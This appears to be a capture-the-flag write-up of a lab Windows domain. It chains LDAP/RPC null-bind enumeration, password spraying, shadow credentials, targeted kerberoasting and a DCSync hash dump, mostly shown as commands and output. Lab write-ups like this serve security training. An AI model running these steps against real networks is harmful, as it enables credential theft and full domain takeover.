---
title: Ronin - Recovery
date: 2026-07-25
image: cover.png
tags: [Ronin, Hard, Windows, Active Directory]
excerpt: Null-bind LDAP/RPC leaks a description-field password, and a BloodHound-mapped chain - spray to j.ortega, shadow credentials on s.connery, a strings password from mount.exe, a WriteSPN kerberoast, then GenericAll on the DC - lands a DC01$ DCSync for Administrator.
---

### Machine Details

→ Wireguard: `sudo wg-quick up standalone`

→ IP: `172.16.18.19`

### NMAP Scanning

```bash
Open 172.16.18.19:53
Open 172.16.18.19:88
Open 172.16.18.19:135
Open 172.16.18.19:139
Open 172.16.18.19:389
Open 172.16.18.19:445
Open 172.16.18.19:464
Open 172.16.18.19:593
Open 172.16.18.19:636
Open 172.16.18.19:3268
Open 172.16.18.19:3269
Open 172.16.18.19:5357
Open 172.16.18.19:5985
Open 172.16.18.19:9389
Open 172.16.18.19:49669
Open 172.16.18.19:49689
Open 172.16.18.19:49690
Open 172.16.18.19:49693
Open 172.16.18.19:49692
Open 172.16.18.19:49706
Open 172.16.18.19:49719
Open 172.16.18.19:49815
```

### SMB - Auth Enumeration

```bash
➜  recovery netexec smb 172.16.18.19 -u '' -p '' --shares
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:False)
SMB         172.16.18.19    445    DC01             [+] recovery.local\:
SMB         172.16.18.19    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
➜  recovery netexec smb 172.16.18.19 -u 'Guest' -p '' --shares
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:False)
SMB         172.16.18.19    445    DC01             [-] recovery.local\Guest: STATUS_ACCOUNT_DISABLED
➜  recovery netexec smb 172.16.18.19 -u '0xd1s' -p '' --shares
SMB         172.16.18.19    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:recovery.local) (signing:True) (SMBv1:False)
SMB         172.16.18.19    445    DC01             [-] recovery.local\0xd1s: STATUS_LOGON_FAILURE
```

### LDAP Enumeration

{% image %}

The LDAP service accepts a NULL bind, so the directory enumerates without any credentials.

RPC also allows NULL authentication, which hands over the domain user list:

```bash
➜  recovery rpcclient -U "" -N 172.16.18.19
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[s.connery] rid:[0x44f]
user:[m.gibson] rid:[0x450]
user:[j.statham] rid:[0x451]
user:[s.johansson] rid:[0x452]
user:[j.ortega] rid:[0x453]
user:[w.dafoe] rid:[0x455]
rpcclient $> querydispinfo2
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfb6 RID: 0x453 acb: 0x00000210 Account: j.ortega	Name: j.ortega	Desc: (null)
index: 0xfb4 RID: 0x451 acb: 0x00000210 Account: j.statham	Name: j.statham	Desc: ChangeMe2025!
index: 0xfb3 RID: 0x450 acb: 0x00000210 Account: m.gibson	Name: m.gibson	Desc: (null)
index: 0xfb2 RID: 0x44f acb: 0x00000210 Account: s.connery	Name: s.connery	Desc: (null)
index: 0xfb5 RID: 0x452 acb: 0x00000210 Account: s.johansson	Name: s.johansson	Desc: (null)
index: 0xff5 RID: 0x455 acb: 0x00000210 Account: w.dafoe	Name: w.dafoe	Desc: (null)
```

j.statham's Description field carries a stray value, `ChangeMe2025!`. That attribute is world-readable, and a starter password parked there is a classic leak:

{% image2 %}

To map the domain I ran rusthound-ce with the same null credentials:

```bash
➜  recovery rusthound-ce --domain recovery.local --ldapusername '' --ldappassword '' --ldapfqdn DC01.recovery.local --ldapip 172.16.18.19 --ldapport 389 --collectionmethod All --zip
---------------------------------------------------
Initializing RustHound-CE at 19:26:46 on 04/01/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-04-01T16:26:46Z INFO  rusthound_ce] Verbosity level: Info
[2026-04-01T16:26:46Z INFO  rusthound_ce] Collection method: All
[2026-04-01T16:26:47Z INFO  rusthound_ce::ldap] Connected to RECOVERY.LOCAL Active Directory!
[2026-04-01T16:26:47Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-04-01T16:26:47Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=recovery,DC=local
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=recovery,DC=local
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=recovery,DC=local
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=recovery,DC=local
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-04-01T16:26:48Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=recovery,DC=local
[2026-04-01T16:26:48Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-04-01T16:26:48Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 50
[2026-04-01T16:26:48Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] 8 users parsed!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] 47 groups parsed!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] 17 containers parsed!
[2026-04-01T16:26:48Z INFO  rusthound_ce::json::maker::common] .//20260401192648_recovery-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 19:26:48 on 04/01/26! Happy Graphing!
```

Loading the resulting zip into BloodHound maps the objects and the edges between them:

{% image3 %}

Spraying `ChangeMe2025!` across the domain users lands a hit on j.ortega, the same password reused on another account:

{% image4 %}

BloodHound places j.ortega on a usable attack path:

{% image5 %}

j.ortega also belongs to Remote Management Users, so the account can reach the DC over WinRM:

{% image6 %}

That path lets j.ortega write the `msDS-KeyCredentialLink` attribute on s.connery. pywhisker abuses it by planting a certificate there, a shadow credential that then authenticates as s.connery through PKINIT:

```bash
(pywisker-venv) ➜  pywhisker git:(main) ✗ python3 pywhisker/pywhisker.py -d recovery.local -u 'j.ortega' -p 'ChangeMe2025!' --target 'S.CONNERY' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=s.connery,CN=Users,DC=recovery,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: ca2c244d-ecd7-eeb4-538a-e5b1b359d71b
[*] Updating the msDS-KeyCredentialLink attribute of S.CONNERY
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: mozr7ENP.pfx
/opt/pywhisker/pywhisker/pywhisker.py:54: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: mozr7ENP.pfx
[i] Passwort für PFX: pVFBtyFWlq5WzYnZdQSg
[+] Saved PFX (#PKCS12) certificate & key at path: mozr7ENP.pfx
[*] Must be used with password: pVFBtyFWlq5WzYnZdQSg
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

→ Getting the TGT file:

```bash
➜  recovery sudo faketime '2026-04-01 17:43:39' python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx ./mozr7ENP.pfx -pfx-pass 'pVFBtyFWlq5WzYnZdQSg' recovery.local/s.connery s.connery.ccache
[sudo] password for kali:
2026-04-01 17:43:39,505 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2026-04-01 17:43:39,529 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2026-04-01 17:43:47,453 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2026-04-01 17:43:47,453 minikerberos INFO     d0770cba4c50ea40b5ba7579a7917a56b315f1deb3b1ba333d059cce1adb59da
INFO:minikerberos:d0770cba4c50ea40b5ba7579a7917a56b315f1deb3b1ba333d059cce1adb59da
2026-04-01 17:43:47,459 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

→ Inspecting the ccache file:

{% image7 %}

The same PFX also feeds `certipy-ad`, which PKINITs for a TGT and then unwraps s.connery's NT hash in one step:

```bash
➜  recovery sudo faketime '2026-04-01 17:46:38' certipy-ad auth -pfx ./mozr7ENP.pfx -password 'pVFBtyFWlq5WzYnZdQSg' -dc-ip 172.16.18.19 -username 's.connery' -domain recovery.local
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 's.connery@recovery.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 's.connery.ccache'
File 's.connery.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 's.connery.ccache'
[*] Trying to retrieve NT hash for 's.connery'
[*] Got hash for 's.connery@recovery.local': aad3b435b51404eeaad3b435b51404ee:406345455039820bb7e5fad7cf82c556
```

→ Connecting to the DC:

{% image8 %}

The `C:\` root holds a `Utils` folder with a `mount.exe` binary:

{% image9 %}

Running `strings` over the binary surfaces a hardcoded password, `R0ckth!spass678`.

Spraying that password across the domain reveals the next account, s.johansson:

{% image10 %}

s.johansson holds `WriteSPN` over `w.dafoe`:

{% image11 %}

s.johansson also holds `GenericAll` on the Domain Controller object:

{% image12 %}

The `WriteSPN` right comes first. It allows setting a servicePrincipalName on `w.dafoe`, which makes the account kerberoastable. `targetedKerberoast` adds a temporary SPN, requests the service ticket, and prints the roastable hash:

```bash
➜  recovery sudo faketime '2026-04-01 17:56:13' python3 /opt/targetedKerberoast/targetedKerberoast.py -d recovery.local -u 's.johansson' -p 'R0ckth!spass678' --dc-host DC01.recovery.local --dc-ip 172.16.18.19
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (w.dafoe)
$krb5tgs$23$*w.dafoe$RECOVERY.LOCAL$recovery.local/w.dafoe*$fd3b07f7ee4d6f59ebfdf6cc7ce7b702$cca015dfcba0a19614cd62c9b1e937659a7d0ae21c6b57c1b5df1aaa362a006443fa1727db18d404efc15a4465590e35029133480cc1caf485f43808a77c556b74c017df6f90a6106e2229d83940618d7f7950fbd723ef8ce6d250da1ebe402ff54b19b0c4ac243c2ce8c4ca81beb5f2b91b718ccfa7397854b7b0f8593861aafa1e85989a02670f7d9cf7b17fbbb999c72ecb54db5e34901a69a8c897eb5d1db0c32b14b45093f8e6c92e7856b4962df133ea3bdff31460d0275abb44b8bd585f014ec076a621cc9266a81635851da775fb5316246e3b5bfce667ba89215c5bd212249766b7b877504072f59f9763b33780a01d247413d9914be57535a7b9b12fe532790aabbac6dff56952bbdb3b455648c1e724e2f6a5710daf9a639b9a38f58dcf5470569d9e3fd916ec7b221f1c92289d45190c81a8d9bcbe8346023752de6eb3f56a7de60e26648da754091e1c2f8c78fc1e8d978efc8a23ad040ab5915f94d4163ed38d476b40ad1ad5a39cbbdaf5e39665cc41bf68b600f423f0f1867c6f994b01474198a0ed03f74527ccfd211f69b087ac94bd7a5d1a5194468dfe0c9e48cb148e66eabde8d3acf5f45dcab14b50c8f0c674960ba2fc30a54ec9f6d187edb024c8935dbe5f78537081ac7ba9b891beb63af5357e8b565a3bf138529411dcfd57d7111dec08267ad5e77f3899507c78e399159734839583e31ee1cb08fc46ba3c5e167c8c6a05b8eb5f46d98098ae73476f8e6beac5516ec9cc423a73b672da1a96cd108b7bbafd4d1635085bd9a412981983117818c4a6c116ef4981c68f69f273b4b70fd1fee0bb7cd1580dd0eb989dd5a6ff02200b37ed2a30b723574296ca1e4bf03febbd5a46eced1612b15b4c4ebb739eabedef2b88966d90644bd07b679b109bad9bd560ba31edac833ab845af2f7da558d9d3ac4f7519248156c9100550f2cfe99760c68d6cf8c14a8b28aef50ffd95f783d3768c7c3acf8b9afe69986b14f8e1919d53f4abdf362b5076ceded764ff292dd7625103e1b370ddaf69a93b3e89c1dda42a13b563c97c0ac65f9c9aa1a663e15e664357f360a70d284ae35ee12486312476217264d7cae49a3819358320885399b7b03708148ad1d36cac956d09de306fdbcbcef5f46ac4890864b860d99a6ec4c3ba62cf5bf9b2b40386538788d1059dc2b1cf4d31ad1dde3cb198e9beec624a4ccd2682f7ebb5504ef607e4f1ac97522e00132df7a597b80b23d1ce7913fca823d51a00add33512e67b8d921200f1137cbfa54ac40ec283e04736a2222143d0187e64931da09953e8257f4e1e10adaa221d20fe933fe3113d0c4d20fee53c3384fd35737051f55966f92d2df7c5c8c830837e1bee9b91e163ad5ea30ba5bfdb9eec3c530b089833b210dc86fe025b6504e3b2511f85c020f114997c0f6e4e30b468723a2cb54af4597925b53add39d9548f274056f119c1bcfcde9b8dd77cd73d98df5783801a14c45e96a98e68ff46b01f26de93ff892980b7bfa140bdf1df6790b4417ea78fc60985409b658332
```

The ticket is encrypted with a key derived from w.dafoe's password, so it cracks offline:

```bash
➜  recovery sudo john --wordlist=/usr/share/wordlists/rockyou.txt w.dafoe.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mdmdancer3!      (?)
1g 0:00:00:01 DONE (2026-04-01 19:57) 0.5813g/s 3298Kp/s 3298Kc/s 3298KC/s me y u..mdjf1208
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The `GenericAll` on the DC opens the final move. The first attempt configures RBCD against DC01:

{% image13 %}

The RBCD path stalls, so pywhisker runs again, this time dropping shadow credentials on the DC01 machine account:

{% image14 %}

A domain controller's machine account carries replication rights, so DC01$ can run a DCSync and pull every hash in the domain:

```bash
➜  recovery impacket-secretsdump recovery.local/'DC01$'@DC01.recovery.local -hashes :8c68157c6e563f3048fdac75f466dcef
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce7730360d7582acb147b42647f5b2c8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dd573ddccea61fc1cbcd1bc6c968ba43:::
recovery.local\s.connery:1103:aad3b435b51404eeaad3b435b51404ee:406345455039820bb7e5fad7cf82c556:::
recovery.local\m.gibson:1104:aad3b435b51404eeaad3b435b51404ee:406345455039820bb7e5fad7cf82c556:::
recovery.local\j.statham:1105:aad3b435b51404eeaad3b435b51404ee:406345455039820bb7e5fad7cf82c556:::
recovery.local\s.johansson:1106:aad3b435b51404eeaad3b435b51404ee:3c681ea3cda109b292f1fdb9e006de61:::
recovery.local\j.ortega:1107:aad3b435b51404eeaad3b435b51404ee:2632484636d765a72e5ca52002b81f77:::
recovery.local\w.dafoe:1109:aad3b435b51404eeaad3b435b51404ee:02fc2dbb7f775e3ec5be318ef804c1f5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8c68157c6e563f3048fdac75f466dcef:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:31e1941abb5f49e50f6a83415dc999222891e4e1a79a96a683fd8ef7d896a5d1
Administrator:aes128-cts-hmac-sha1-96:cb676946bb8485af8fefa28bb0d8486d
Administrator:des-cbc-md5:bf19321cec7cba57
krbtgt:aes256-cts-hmac-sha1-96:8ea3a29ad83fa49c60434ab83b901b310b8121f7cd18dbf62a9fe60ead657d23
krbtgt:aes128-cts-hmac-sha1-96:97265f81dba745c797866e99ce6caa86
krbtgt:des-cbc-md5:01d62a3e6d1a8613
recovery.local\s.connery:aes256-cts-hmac-sha1-96:c70c4a4fb0d8b5dccecff1bc855f909411706f9e4d06d689bc6e60aac0cb5dfd
recovery.local\s.connery:aes128-cts-hmac-sha1-96:0ee70ad83fc12e953e94cfe143db3977
recovery.local\s.connery:des-cbc-md5:3491524345b0d69d
recovery.local\m.gibson:aes256-cts-hmac-sha1-96:ccc1fe0fe2a6775bf34de375978ca098f6a3ffb0c78938314adeb6e59b7bc9d6
recovery.local\m.gibson:aes128-cts-hmac-sha1-96:c23361606d86eeffbd696f5c42f98094
recovery.local\m.gibson:des-cbc-md5:868070f25107ab7c
recovery.local\j.statham:aes256-cts-hmac-sha1-96:fabf7ef26c80525f1b7e0c19968c014476fd57086480909ac0441bb5d46bc8e1
recovery.local\j.statham:aes128-cts-hmac-sha1-96:bd0ff4efc08a02bbe1d2572ac03dc7cd
recovery.local\j.statham:des-cbc-md5:a20de902a20431e3
recovery.local\s.johansson:aes256-cts-hmac-sha1-96:285b771f397b55cdb625fb651506203edec91f45555788ffd39d4cc37680c456
recovery.local\s.johansson:aes128-cts-hmac-sha1-96:0d9a1eeafd332edb3eec83ddd9cd1894
recovery.local\s.johansson:des-cbc-md5:2c895d5498139b52
recovery.local\j.ortega:aes256-cts-hmac-sha1-96:89e7c04083d043978c7a9a9165aca157f95356722ea0c699f8bfe6959badd85c
recovery.local\j.ortega:aes128-cts-hmac-sha1-96:0bb1f3c14f9c140bcf668442e3f692b5
recovery.local\j.ortega:des-cbc-md5:151937d0c8a73d9d
recovery.local\w.dafoe:aes256-cts-hmac-sha1-96:d7135dc9313428f90dee33af7677c2c2520fbee63208fca516dbd4510fb2d72f
recovery.local\w.dafoe:aes128-cts-hmac-sha1-96:b45db3d18abdab46259d7e5c4d2c4a87
recovery.local\w.dafoe:des-cbc-md5:7f5183abfd3dab32
DC01$:aes256-cts-hmac-sha1-96:cfa074fb253179517f398047a6f095568f89d00712b701cf56b7a11802227fb1
DC01$:aes128-cts-hmac-sha1-96:5120d99bb82c2f52cf53aa5d6c0d66b7
DC01$:des-cbc-md5:5108ab9d1c1f4a20
```

The recovered Administrator hash logs straight in:

{% image15 %}

The flag follows:

{% image16 %}